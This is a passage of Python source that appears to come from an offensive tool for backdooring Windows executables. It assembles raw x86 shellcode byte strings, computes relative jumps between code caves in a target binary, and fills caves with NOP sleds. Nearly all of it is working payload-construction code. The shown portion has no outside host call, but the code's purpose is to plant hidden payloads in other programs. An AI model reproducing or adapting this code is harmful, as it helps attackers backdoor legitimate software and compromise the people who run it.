        self.shellcode1 += "\xff\x13"               # call dword ptr [ebx]
        self.shellcode1 += ("\x89\xC3"
                            "\x89\xC7"
                            "\x89\xF1"
                            )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x16"  # <--length of shellcode below

        self.shellcode1 += "\x5e"
        self.shellcode1 += ("\xF2\xA4"
                            "\x31\xC0"
                            "\x50"
                            "\x50"
                            "\x50"
                            "\x53"
                            "\x50"
                            "\x50"
                            )

        self.shellcode1 += "\x3E\xFF\x55\x00"      # Call DWORD PTR DS: [EBP]
        self.shellcode1 += ("\x58"
                            "\x61"                  # POP AD
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += "\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def cave_miner_inline(self, flItms, CavesPicked={}):
        """
        Sample code for finding sutable code caves
        """
        breakupvar = eat_code_caves(flItms, 0, 1)
        self.shellcode1 = ""

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        #else:
        #    self.shellcode1 += "\x89\x00\x00\x00"

        self.shellcode1 += ("\x90" * 40
                            )

        self.shellcode2 = ("\x90" * 48
                           )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

##########################################################
#                END win32 shellcodes                    #
##########################################################
